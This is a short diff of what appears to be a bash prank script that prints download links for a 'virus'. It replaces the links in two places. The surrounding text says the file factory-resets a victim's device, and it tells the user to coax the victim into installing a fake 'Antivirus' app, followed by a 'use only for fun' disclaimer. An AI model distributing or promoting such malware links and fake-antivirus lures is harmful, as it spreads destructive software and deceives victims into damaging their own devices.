@@ -126,7 +126,7 @@ echo -e "\e[91m 😈  Copy below link and paste in any browser and download viru
 device it will be factory reset and lot more happens.
                                 👇👇👇
 
-         \e[92mL1NK :- \e[96mhttps://shareus.in/?i=JkapJo1Po\e[91m
+         \e[92mL1NK :- \e[96mhttps://dlsharefile.com/file/1429135210\e[91m
 
                                  👆👆👆
 Use only for fun purpose not for harming someone 😇✌️.
@@ -161,7 +161,7 @@ that he should install this application or else his
 device will not be recovered.(Antivirus)
                     👇👇👇
 
-        \e[92mL1NK :- \e[96mhttps://shareus.in/?i=JkapJo1Po\e[93m
+        \e[92mL1NK :- \e[96mhttps://dlsharefile.com/file/1429135210\e[93m
 
                     👆👆👆
 Use only for fun purpose not for harming someone 😇✌️. 
